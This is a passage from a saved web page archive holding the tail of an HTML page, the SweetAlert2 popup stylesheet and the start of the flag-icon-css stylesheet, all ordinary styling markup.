=3D"none" stroke=3D"currentColor" stroke-width=3D"2" stroke-linecap=3D"roun=
d" stroke-linejoin=3D"round"><path d=3D"M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-=
2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x=3D"8" y=3D"2" width=
=3D"8" height=3D"4" rx=3D"1" ry=3D"1"></rect></svg> <span>Copied</span></di=
v></template></hv-copy-modal></body><grammarly-desktop-integration data-gra=
mmarly-shadow-root=3D"true"><template shadowmode=3D"open"><div aria-label=
=3D"grammarly-integration" role=3D"group" tabindex=3D"-1" class=3D"grammarl=
y-desktop-integration" data-content=3D"{&quot;mode&quot;:&quot;full&quot;,&=
quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></templat=
e></grammarly-desktop-integration></html>
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: cid:css-4723b45b-3ce4-4b1e-a2ff-e0c45ed47900@mhtml.blink

@charset "utf-8";

@-webkit-keyframes swal2-show {=20
  0% { transform: scale(0.7); }
  45% { transform: scale(1.05); }
  80% { transform: scale(0.95); }
  100% { transform: scale(1); }
}

@keyframes swal2-show {=20
  0% { transform: scale(0.7); }
  45% { transform: scale(1.05); }
  80% { transform: scale(0.95); }
  100% { transform: scale(1); }
}

@-webkit-keyframes swal2-hide {=20
  0% { transform: scale(1); opacity: 1; }
  100% { transform: scale(0.5); opacity: 0; }
}

@keyframes swal2-hide {=20
  0% { transform: scale(1); opacity: 1; }
  100% { transform: scale(0.5); opacity: 0; }
}

@-webkit-keyframes swal2-animate-success-line-tip {=20
  0% { top: 1.1875em; left: 0.0625em; width: 0px; }
  54% { top: 1.0625em; left: 0.125em; width: 0px; }
  70% { top: 2.1875em; left: -0.375em; width: 3.125em; }
  84% { top: 3em; left: 1.3125em; width: 1.0625em; }
  100% { top: 2.8125em; left: 0.875em; width: 1.5625em; }
}

@keyframes swal2-animate-success-line-tip {=20
  0% { top: 1.1875em; left: 0.0625em; width: 0px; }
  54% { top: 1.0625em; left: 0.125em; width: 0px; }
  70% { top: 2.1875em; left: -0.375em; width: 3.125em; }
  84% { top: 3em; left: 1.3125em; width: 1.0625em; }
  100% { top: 2.8125em; left: 0.875em; width: 1.5625em; }
}

@-webkit-keyframes swal2-animate-success-line-long {=20
  0% { top: 3.375em; right: 2.875em; width: 0px; }
  65% { top: 3.375em; right: 2.875em; width: 0px; }
  84% { top: 2.1875em; right: 0px; width: 3.4375em; }
  100% { top: 2.375em; right: 0.5em; width: 2.9375em; }
}

@keyframes swal2-animate-success-line-long {=20
  0% { top: 3.375em; right: 2.875em; width: 0px; }
  65% { top: 3.375em; right: 2.875em; width: 0px; }
  84% { top: 2.1875em; right: 0px; width: 3.4375em; }
  100% { top: 2.375em; right: 0.5em; width: 2.9375em; }
}

@-webkit-keyframes swal2-rotate-success-circular-line {=20
  0% { transform: rotate(-45deg); }
  5% { transform: rotate(-45deg); }
  12% { transform: rotate(-405deg); }
  100% { transform: rotate(-405deg); }
}

@keyframes swal2-rotate-success-circular-line {=20
  0% { transform: rotate(-45deg); }
  5% { transform: rotate(-45deg); }
  12% { transform: rotate(-405deg); }
  100% { transform: rotate(-405deg); }
}

@-webkit-keyframes swal2-animate-error-x-mark {=20
  0% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
  50% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
  80% { margin-top: -0.375em; transform: scale(1.15); }
  100% { margin-top: 0px; transform: scale(1); opacity: 1; }
}

@keyframes swal2-animate-error-x-mark {=20
  0% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
  50% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
  80% { margin-top: -0.375em; transform: scale(1.15); }
  100% { margin-top: 0px; transform: scale(1); opacity: 1; }
}

@-webkit-keyframes swal2-animate-error-icon {=20
  0% { transform: rotateX(100deg); opacity: 0; }
  100% { transform: rotateX(0deg); opacity: 1; }
}

@keyframes swal2-animate-error-icon {=20
  0% { transform: rotateX(100deg); opacity: 0; }
  100% { transform: rotateX(0deg); opacity: 1; }
}

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast { =
flex-direction: column; align-items: stretch; }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .s=
wal2-actions { flex: 1 1 0%; align-self: stretch; justify-content: flex-end=
; height: 2.2em; }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .s=
wal2-loading { justify-content: center; }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .s=
wal2-input { height: 2em; margin: 0.3125em auto; font-size: 1em; }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .s=
wal2-validationerror { font-size: 1em; }

body.swal2-toast-shown > .swal2-container { position: fixed; background-col=
or: transparent; }

body.swal2-toast-shown > .swal2-container.swal2-shown { background-color: t=
ransparent; }

body.swal2-toast-shown > .swal2-container.swal2-top { inset: 0px auto auto =
50%; transform: translateX(-50%); }

body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-s=
hown > .swal2-container.swal2-top-right { inset: 0px 0px auto auto; }

body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast=
-shown > .swal2-container.swal2-top-left { inset: 0px auto auto 0px; }

body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-to=
ast-shown > .swal2-container.swal2-center-left { inset: 50% auto auto 0px; =
transform: translateY(-50%); }

body.swal2-toast-shown > .swal2-container.swal2-center { inset: 50% auto au=
to 50%; transform: translate(-50%, -50%); }

body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toas=
t-shown > .swal2-container.swal2-center-right { inset: 50% 0px auto auto; t=
ransform: translateY(-50%); }

body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-to=
ast-shown > .swal2-container.swal2-bottom-left { inset: auto auto 0px 0px; =
}

body.swal2-toast-shown > .swal2-container.swal2-bottom { inset: auto auto 0=
px 50%; transform: translateX(-50%); }

body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toas=
t-shown > .swal2-container.swal2-bottom-right { inset: auto 0px 0px auto; }

.swal2-popup.swal2-toast { flex-direction: row; align-items: center; width:=
 auto; padding: 0.625em; box-shadow: rgb(217, 217, 217) 0px 0px 0.625em; ov=
erflow-y: hidden; }

.swal2-popup.swal2-toast .swal2-header { flex-direction: row; }

.swal2-popup.swal2-toast .swal2-title { justify-content: flex-start; margin=
: 0px 0.6em; font-size: 1em; }

.swal2-popup.swal2-toast .swal2-close { position: initial; }

.swal2-popup.swal2-toast .swal2-content { justify-content: flex-start; font=
-size: 1em; }

.swal2-popup.swal2-toast .swal2-icon { width: 2em; min-width: 2em; height: =
2em; margin: 0px; }

.swal2-popup.swal2-toast .swal2-icon-text { font-size: 2em; font-weight: bo=
ld; line-height: 1em; }

.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring { wi=
dth: 2em; height: 2em; }

.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=3D"swal2-x-mark-li=
ne"] { top: 0.875em; width: 1.375em; }

.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=3D"swal2-x-mark-li=
ne"][class$=3D"left"] { left: 0.3125em; }

.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=3D"swal2-x-mark-li=
ne"][class$=3D"right"] { right: 0.3125em; }

.swal2-popup.swal2-toast .swal2-actions { height: auto; margin: 0px 0.3125e=
m; }

.swal2-popup.swal2-toast .swal2-styled { margin: 0px 0.3125em; padding: 0.3=
125em 0.625em; font-size: 1em; }

.swal2-popup.swal2-toast .swal2-styled:focus { box-shadow: rgb(255, 255, 25=
5) 0px 0px 0px 0.0625em, rgba(50, 100, 150, 0.4) 0px 0px 0px 0.125em; }

.swal2-popup.swal2-toast .swal2-success { border-color: rgb(165, 220, 134);=
 }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-circular-l=
ine"] { position: absolute; width: 2em; height: 2.8125em; transform: rotate=
(45deg); border-radius: 50%; }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-circular-l=
ine"][class$=3D"left"] { top: -0.25em; left: -0.9375em; transform: rotate(-=
45deg); transform-origin: 2em 2em; border-radius: 4em 0px 0px 4em; }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-circular-l=
ine"][class$=3D"right"] { top: -0.25em; left: 0.9375em; transform-origin: 0=
px 2em; border-radius: 0px 4em 4em 0px; }

.swal2-popup.swal2-toast .swal2-success .swal2-success-ring { width: 2em; h=
eight: 2em; }

.swal2-popup.swal2-toast .swal2-success .swal2-success-fix { top: 0px; left=
: 0.4375em; width: 0.4375em; height: 2.6875em; }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-line"] { h=
eight: 0.3125em; }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-line"][cla=
ss$=3D"tip"] { top: 1.125em; left: 0.1875em; width: 0.75em; }

.swal2-popup.swal2-toast .swal2-success [class^=3D"swal2-success-line"][cla=
ss$=3D"long"] { top: 0.9375em; right: 0.1875em; width: 1.375em; }

.swal2-popup.swal2-toast.swal2-show { animation: 0.5s ease 0s 1 normal none=
 running showSweetToast; }

.swal2-popup.swal2-toast.swal2-hide { animation: 0.2s ease 0s 1 normal forw=
ards running hideSweetToast; }

.swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-ti=
p { animation: 0.75s ease 0s 1 normal none running animate-toast-success-ti=
p; }

.swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-lo=
ng { animation: 0.75s ease 0s 1 normal none running animate-toast-success-l=
ong; }

@-webkit-keyframes showSweetToast {=20
  0% { transform: translateY(-0.625em) rotateZ(2deg); opacity: 0; }
  33% { transform: translateY(0px) rotateZ(-2deg); opacity: 0.5; }
  66% { transform: translateY(0.3125em) rotateZ(2deg); opacity: 0.7; }
  100% { transform: translateY(0px) rotateZ(0deg); opacity: 1; }
}

@keyframes showSweetToast {=20
  0% { transform: translateY(-0.625em) rotateZ(2deg); opacity: 0; }
  33% { transform: translateY(0px) rotateZ(-2deg); opacity: 0.5; }
  66% { transform: translateY(0.3125em) rotateZ(2deg); opacity: 0.7; }
  100% { transform: translateY(0px) rotateZ(0deg); opacity: 1; }
}

@-webkit-keyframes hideSweetToast {=20
  0% { opacity: 1; }
  33% { opacity: 0.5; }
  100% { transform: rotateZ(1deg); opacity: 0; }
}

@keyframes hideSweetToast {=20
  0% { opacity: 1; }
  33% { opacity: 0.5; }
  100% { transform: rotateZ(1deg); opacity: 0; }
}

@-webkit-keyframes animate-toast-success-tip {=20
  0% { top: 0.5625em; left: 0.0625em; width: 0px; }
  54% { top: 0.125em; left: 0.125em; width: 0px; }
  70% { top: 0.625em; left: -0.25em; width: 1.625em; }
  84% { top: 1.0625em; left: 0.75em; width: 0.5em; }
  100% { top: 1.125em; left: 0.1875em; width: 0.75em; }
}

@keyframes animate-toast-success-tip {=20
  0% { top: 0.5625em; left: 0.0625em; width: 0px; }
  54% { top: 0.125em; left: 0.125em; width: 0px; }
  70% { top: 0.625em; left: -0.25em; width: 1.625em; }
  84% { top: 1.0625em; left: 0.75em; width: 0.5em; }
  100% { top: 1.125em; left: 0.1875em; width: 0.75em; }
}

@-webkit-keyframes animate-toast-success-long {=20
  0% { top: 1.625em; right: 1.375em; width: 0px; }
  65% { top: 1.25em; right: 0.9375em; width: 0px; }
  84% { top: 0.9375em; right: 0px; width: 1.125em; }
  100% { top: 0.9375em; right: 0.1875em; width: 1.375em; }
}

@keyframes animate-toast-success-long {=20
  0% { top: 1.625em; right: 1.375em; width: 0px; }
  65% { top: 1.25em; right: 0.9375em; width: 0px; }
  84% { top: 0.9375em; right: 0px; width: 1.125em; }
  100% { top: 0.9375em; right: 0.1875em; width: 1.375em; }
}

html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown), body.swal=
2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) { height: auto; ove=
rflow-y: hidden; }

body.swal2-no-backdrop .swal2-shown { inset: auto; background-color: transp=
arent; }

body.swal2-no-backdrop .swal2-shown > .swal2-modal { box-shadow: rgba(0, 0,=
 0, 0.4) 0px 0px 10px; }

body.swal2-no-backdrop .swal2-shown.swal2-top { top: 0px; left: 50%; transf=
orm: translateX(-50%); }

body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop=
 .swal2-shown.swal2-top-left { top: 0px; left: 0px; }

body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .=
swal2-shown.swal2-top-right { top: 0px; right: 0px; }

body.swal2-no-backdrop .swal2-shown.swal2-center { top: 50%; left: 50%; tra=
nsform: translate(-50%, -50%); }

body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backd=
rop .swal2-shown.swal2-center-left { top: 50%; left: 0px; transform: transl=
ateY(-50%); }

body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdro=
p .swal2-shown.swal2-center-right { top: 50%; right: 0px; transform: transl=
ateY(-50%); }

body.swal2-no-backdrop .swal2-shown.swal2-bottom { bottom: 0px; left: 50%; =
transform: translateX(-50%); }

body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backd=
rop .swal2-shown.swal2-bottom-left { bottom: 0px; left: 0px; }

body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdro=
p .swal2-shown.swal2-bottom-right { right: 0px; bottom: 0px; }

.swal2-container { display: flex; position: fixed; inset: 0px; flex-directi=
on: row; align-items: center; justify-content: center; padding: 10px; backg=
round-color: transparent; z-index: 1060; overflow-x: hidden; }

.swal2-container.swal2-top { align-items: flex-start; }

.swal2-container.swal2-top-start, .swal2-container.swal2-top-left { align-i=
tems: flex-start; justify-content: flex-start; }

.swal2-container.swal2-top-end, .swal2-container.swal2-top-right { align-it=
ems: flex-start; justify-content: flex-end; }

.swal2-container.swal2-center { align-items: center; }

.swal2-container.swal2-center-start, .swal2-container.swal2-center-left { a=
lign-items: center; justify-content: flex-start; }

.swal2-container.swal2-center-end, .swal2-container.swal2-center-right { al=
ign-items: center; justify-content: flex-end; }

.swal2-container.swal2-bottom { align-items: flex-end; }

.swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left { a=
lign-items: flex-end; justify-content: flex-start; }

.swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right { al=
ign-items: flex-end; justify-content: flex-end; }

.swal2-container.swal2-grow-fullscreen > .swal2-modal { flex: 1 1 0%; align=
-self: stretch; justify-content: center; display: flex !important; }

.swal2-container.swal2-grow-row > .swal2-modal { flex: 1 1 0%; place-conten=
t: center; display: flex !important; }

.swal2-container.swal2-grow-column { flex: 1 1 0%; flex-direction: column; =
}

.swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-c=
olumn.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom { align=
-items: center; }

.swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-=
grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bo=
ttom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-conta=
iner.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-colum=
n.swal2-bottom-left { align-items: flex-start; }

.swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-gr=
ow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom=
-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.=
swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.sw=
al2-bottom-right { align-items: flex-end; }

.swal2-container.swal2-grow-column > .swal2-modal { flex: 1 1 0%; place-con=
tent: center; display: flex !important; }

.swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):=
not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.sw=
al2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2=
-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-=
left):not(.swal2-bottom-right) > .swal2-modal { margin: auto; }

@media (-ms-high-contrast: none), (-ms-high-contrast: active) {
  .swal2-container .swal2-modal { margin: 0px !important; }
}

.swal2-container.swal2-fade { transition: background-color 0.1s ease 0s; }

.swal2-container.swal2-shown { background-color: rgba(0, 0, 0, 0.4); }

.swal2-popup { display: none; position: relative; flex-direction: column; j=
ustify-content: center; width: 32em; max-width: 100%; padding: 1.25em; bord=
er-radius: 0.3125em; background: rgb(255, 255, 255); font-family: inherit; =
font-size: 1rem; box-sizing: border-box; }

.swal2-popup:focus { outline: none; }

.swal2-popup.swal2-loading { overflow-y: hidden; }

.swal2-popup .swal2-header { display: flex; flex-direction: column; align-i=
tems: center; }

.swal2-popup .swal2-title { display: block; position: relative; max-width: =
100%; margin: 0px 0px 0.4em; padding: 0px; color: rgb(89, 89, 89); font-siz=
e: 1.875em; font-weight: 600; text-align: center; text-transform: none; ove=
rflow-wrap: break-word; }

.swal2-popup .swal2-actions { align-items: center; justify-content: center;=
 margin: 1.25em auto 0px; }

.swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] { o=
pacity: 0.4; }

.swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover { backg=
round-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }

.swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active { back=
ground-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }

.swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm { wid=
th: 2.5em; height: 2.5em; margin: 0.46875em; padding: 0px; border: 0.25em s=
olid transparent; border-radius: 100%; color: transparent; cursor: default;=
 box-sizing: border-box; animation: 1.5s linear 0s infinite normal none run=
ning swal2-rotate-loading; user-select: none; background-color: transparent=
 !important; }

.swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel { marg=
in-right: 30px; margin-left: 30px; }

.swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm=
::after { display: inline-block; width: 15px; height: 15px; margin-left: 5p=
x; border-width: 3px; border-style: solid; border-color: rgb(153, 153, 153)=
 transparent rgb(153, 153, 153) rgb(153, 153, 153); border-image: initial; =
border-radius: 50%; box-shadow: rgb(255, 255, 255) 1px 1px 1px; content: ""=
; animation: 1.5s linear 0s infinite normal none running swal2-rotate-loadi=
ng; }

.swal2-popup .swal2-styled { margin: 0px 0.3125em; padding: 0.625em 2em; fo=
nt-weight: 500; box-shadow: none; }

.swal2-popup .swal2-styled:not([disabled]) { cursor: pointer; }

.swal2-popup .swal2-styled.swal2-confirm { border: 0px; border-radius: 0.25=
em; background: rgb(48, 133, 214); color: rgb(255, 255, 255); font-size: 1.=
0625em; }

.swal2-popup .swal2-styled.swal2-cancel { border: 0px; border-radius: 0.25e=
m; background: rgb(170, 170, 170); color: rgb(255, 255, 255); font-size: 1.=
0625em; }

.swal2-popup .swal2-styled:focus { outline: none; box-shadow: rgb(255, 255,=
 255) 0px 0px 0px 2px, rgba(50, 100, 150, 0.4) 0px 0px 0px 4px; }

.swal2-popup .swal2-footer { justify-content: center; margin: 1.25em 0px 0p=
x; padding-top: 1em; border-top: 1px solid rgb(238, 238, 238); color: rgb(8=
4, 84, 84); font-size: 1em; }

.swal2-popup .swal2-image { max-width: 100%; margin: 1.25em auto; }

.swal2-popup .swal2-close { position: absolute; top: 0px; right: 0px; justi=
fy-content: center; width: 1.2em; min-width: 1.2em; height: 1.2em; margin: =
0px; padding: 0px; transition: color 0.1s ease-out 0s; border: none; border=
-radius: 0px; background: transparent; color: rgb(204, 204, 204); font-fami=
ly: serif; font-size: calc(2.25em); line-height: 1.2em; cursor: pointer; }

.swal2-popup .swal2-close:hover { transform: none; color: rgb(242, 116, 116=
); }

.swal2-popup > .swal2-input, .swal2-popup > .swal2-file, .swal2-popup > .sw=
al2-textarea, .swal2-popup > .swal2-select, .swal2-popup > .swal2-radio, .s=
wal2-popup > .swal2-checkbox { display: none; }

.swal2-popup .swal2-content { justify-content: center; margin: 0px; padding=
: 0px; color: rgb(84, 84, 84); font-size: 1.125em; font-weight: 300; line-h=
eight: normal; overflow-wrap: break-word; }

.swal2-popup #swal2-content { text-align: center; }

.swal2-popup .swal2-input, .swal2-popup .swal2-file, .swal2-popup .swal2-te=
xtarea, .swal2-popup .swal2-select, .swal2-popup .swal2-radio, .swal2-popup=
 .swal2-checkbox { margin: 1em auto; }

.swal2-popup .swal2-input, .swal2-popup .swal2-file, .swal2-popup .swal2-te=
xtarea { width: 100%; transition: border-color 0.3s ease 0s, box-shadow 0.3=
s ease 0s; border: 1px solid rgb(217, 217, 217); border-radius: 0.1875em; f=
ont-size: 1.125em; box-shadow: rgba(0, 0, 0, 0.06) 0px 1px 1px inset; box-s=
izing: border-box; }

.swal2-popup .swal2-input.swal2-inputerror, .swal2-popup .swal2-file.swal2-=
inputerror, .swal2-popup .swal2-textarea.swal2-inputerror { border-color: r=
gb(242, 116, 116) !important; box-shadow: rgb(242, 116, 116) 0px 0px 2px !i=
mportant; }

.swal2-popup .swal2-input:focus, .swal2-popup .swal2-file:focus, .swal2-pop=
up .swal2-textarea:focus { border: 1px solid rgb(180, 219, 237); outline: n=
one; box-shadow: rgb(196, 230, 245) 0px 0px 3px; }

.swal2-popup .swal2-input::-webkit-input-placeholder, .swal2-popup .swal2-f=
ile::-webkit-input-placeholder, .swal2-popup .swal2-textarea::-webkit-input=
-placeholder { color: rgb(204, 204, 204); }

.swal2-popup .swal2-input::placeholder, .swal2-popup .swal2-file::placehold=
er, .swal2-popup .swal2-textarea::placeholder { color: rgb(204, 204, 204); =
}

.swal2-popup .swal2-range input { width: 80%; }

.swal2-popup .swal2-range output { width: 20%; font-weight: 600; text-align=
: center; }

.swal2-popup .swal2-range input, .swal2-popup .swal2-range output { height:=
 2.625em; margin: 1em auto; padding: 0px; font-size: 1.125em; line-height: =
2.625em; }

.swal2-popup .swal2-input { height: 2.625em; padding: 0.75em; }

.swal2-popup .swal2-input[type=3D"number"] { max-width: 10em; }

.swal2-popup .swal2-file { font-size: 1.125em; }

.swal2-popup .swal2-textarea { height: 6.75em; padding: 0.75em; }

.swal2-popup .swal2-select { min-width: 50%; max-width: 100%; padding: 0.37=
5em 0.625em; color: rgb(84, 84, 84); font-size: 1.125em; }

.swal2-popup .swal2-radio, .swal2-popup .swal2-checkbox { align-items: cent=
er; justify-content: center; }

.swal2-popup .swal2-radio label, .swal2-popup .swal2-checkbox label { margi=
n: 0px 0.6em; font-size: 1.125em; }

.swal2-popup .swal2-radio input, .swal2-popup .swal2-checkbox input { margi=
n: 0px 0.4em; }

.swal2-popup .swal2-validationerror { display: none; align-items: center; j=
ustify-content: center; padding: 0.625em; background: rgb(240, 240, 240); c=
olor: rgb(102, 102, 102); font-size: 1em; font-weight: 300; overflow: hidde=
n; }

.swal2-popup .swal2-validationerror::before { display: inline-block; width:=
 1.5em; height: 1.5em; margin: 0px 0.625em; border-radius: 50%; background-=
color: rgb(242, 116, 116); color: rgb(255, 255, 255); font-weight: 600; lin=
e-height: 1.5em; text-align: center; content: "!"; zoom: normal; }

@supports (-ms-accelerator: true) {
  .swal2-range input { width: 100% !important; }
  .swal2-range output { display: none; }
}

@media (-ms-high-contrast: none), (-ms-high-contrast: active) {
  .swal2-range input { width: 100% !important; }
  .swal2-range output { display: none; }
}

.swal2-icon { position: relative; justify-content: center; width: 5em; heig=
ht: 5em; margin: 1.25em auto 1.875em; border: 0.25em solid transparent; bor=
der-radius: 50%; line-height: 5em; cursor: default; box-sizing: content-box=
; user-select: none; zoom: normal; }

.swal2-icon-text { font-size: 3.75em; }

.swal2-icon.swal2-error { border-color: rgb(242, 116, 116); }

.swal2-icon.swal2-error .swal2-x-mark { position: relative; flex-grow: 1; }

.swal2-icon.swal2-error [class^=3D"swal2-x-mark-line"] { display: block; po=
sition: absolute; top: 2.3125em; width: 2.9375em; height: 0.3125em; border-=
radius: 0.125em; background-color: rgb(242, 116, 116); }

.swal2-icon.swal2-error [class^=3D"swal2-x-mark-line"][class$=3D"left"] { l=
eft: 1.0625em; transform: rotate(45deg); }

.swal2-icon.swal2-error [class^=3D"swal2-x-mark-line"][class$=3D"right"] { =
right: 1em; transform: rotate(-45deg); }

.swal2-icon.swal2-warning { border-color: rgb(250, 206, 168); color: rgb(24=
8, 187, 134); }

.swal2-icon.swal2-info { border-color: rgb(157, 224, 246); color: rgb(63, 1=
95, 238); }

.swal2-icon.swal2-question { border-color: rgb(201, 218, 225); color: rgb(1=
35, 173, 189); }

.swal2-icon.swal2-success { border-color: rgb(165, 220, 134); }

.swal2-icon.swal2-success [class^=3D"swal2-success-circular-line"] { positi=
on: absolute; width: 3.75em; height: 7.5em; transform: rotate(45deg); borde=
r-radius: 50%; }

.swal2-icon.swal2-success [class^=3D"swal2-success-circular-line"][class$=
=3D"left"] { top: -0.4375em; left: -2.0635em; transform: rotate(-45deg); tr=
ansform-origin: 3.75em 3.75em; border-radius: 7.5em 0px 0px 7.5em; }

.swal2-icon.swal2-success [class^=3D"swal2-success-circular-line"][class$=
=3D"right"] { top: -0.6875em; left: 1.875em; transform: rotate(-45deg); tra=
nsform-origin: 0px 3.75em; border-radius: 0px 7.5em 7.5em 0px; }

.swal2-icon.swal2-success .swal2-success-ring { position: absolute; top: -0=
.25em; left: -0.25em; width: 100%; height: 100%; border: 0.25em solid rgba(=
165, 220, 134, 0.3); border-radius: 50%; z-index: 2; box-sizing: content-bo=
x; }

.swal2-icon.swal2-success .swal2-success-fix { position: absolute; top: 0.5=
em; left: 1.625em; width: 0.4375em; height: 5.625em; transform: rotate(-45d=
eg); z-index: 1; }

.swal2-icon.swal2-success [class^=3D"swal2-success-line"] { display: block;=
 position: absolute; height: 0.3125em; border-radius: 0.125em; background-c=
olor: rgb(165, 220, 134); z-index: 2; }

.swal2-icon.swal2-success [class^=3D"swal2-success-line"][class$=3D"tip"] {=
 top: 2.875em; left: 0.875em; width: 1.5625em; transform: rotate(45deg); }

.swal2-icon.swal2-success [class^=3D"swal2-success-line"][class$=3D"long"] =
{ top: 2.375em; right: 0.5em; width: 2.9375em; transform: rotate(-45deg); }

.swal2-progresssteps { align-items: center; margin: 0px 0px 1.25em; padding=
: 0px; font-weight: 600; }

.swal2-progresssteps li { display: inline-block; position: relative; }

.swal2-progresssteps .swal2-progresscircle { width: 2em; height: 2em; borde=
r-radius: 2em; background: rgb(48, 133, 214); color: rgb(255, 255, 255); li=
ne-height: 2em; text-align: center; z-index: 20; }

.swal2-progresssteps .swal2-progresscircle:first-child { margin-left: 0px; =
}

.swal2-progresssteps .swal2-progresscircle:last-child { margin-right: 0px; =
}

.swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep { backg=
round: rgb(48, 133, 214); }

.swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal=
2-progresscircle { background: rgb(173, 216, 230); }

.swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal=
2-progressline { background: rgb(173, 216, 230); }

.swal2-progresssteps .swal2-progressline { width: 2.5em; height: 0.4em; mar=
gin: 0px -1px; background: rgb(48, 133, 214); z-index: 10; }

[class^=3D"swal2"] { -webkit-tap-highlight-color: transparent; }

.swal2-show { animation: 0.3s ease 0s 1 normal none running swal2-show; }

.swal2-show.swal2-noanimation { animation: 0s ease 0s 1 normal none running=
 none; }

.swal2-hide { animation: 0.15s ease 0s 1 normal forwards running swal2-hide=
; }

.swal2-hide.swal2-noanimation { animation: 0s ease 0s 1 normal none running=
 none; }

[dir=3D"rtl"] .swal2-close { right: auto; left: 0px; }

.swal2-animate-success-icon .swal2-success-line-tip { animation: 0.75s ease=
 0s 1 normal none running swal2-animate-success-line-tip; }

.swal2-animate-success-icon .swal2-success-line-long { animation: 0.75s eas=
e 0s 1 normal none running swal2-animate-success-line-long; }

.swal2-animate-success-icon .swal2-success-circular-line-right { animation:=
 4.25s ease-in 0s 1 normal none running swal2-rotate-success-circular-line;=
 }

.swal2-animate-error-icon { animation: 0.5s ease 0s 1 normal none running s=
wal2-animate-error-icon; }

.swal2-animate-error-icon .swal2-x-mark { animation: 0.5s ease 0s 1 normal =
none running swal2-animate-error-x-mark; }

@-webkit-keyframes swal2-rotate-loading {=20
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes swal2-rotate-loading {=20
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css

@charset "utf-8";

.flag-icon-background { background-size: contain; background-position: 50% =
center; background-repeat: no-repeat; }

.flag-icon { background-size: contain; background-position: 50% center; bac=
kground-repeat: no-repeat; position: relative; display: inline-block; width=
: 1.33333em; line-height: 1em; }

.flag-icon::before { content: "=C2=A0"; }

.flag-icon.flag-icon-squared { width: 1em; }

.flag-icon-ad { background-image: url("../flags/4x3/ad.svg"); }

.flag-icon-ad.flag-icon-squared { background-image: url("../flags/1x1/ad.sv=
g"); }

.flag-icon-ae { background-image: url("../flags/4x3/ae.svg"); }

.flag-icon-ae.flag-icon-squared { background-image: url("../flags/1x1/ae.sv=
g"); }

.flag-icon-af { background-image: url("../flags/4x3/af.svg"); }

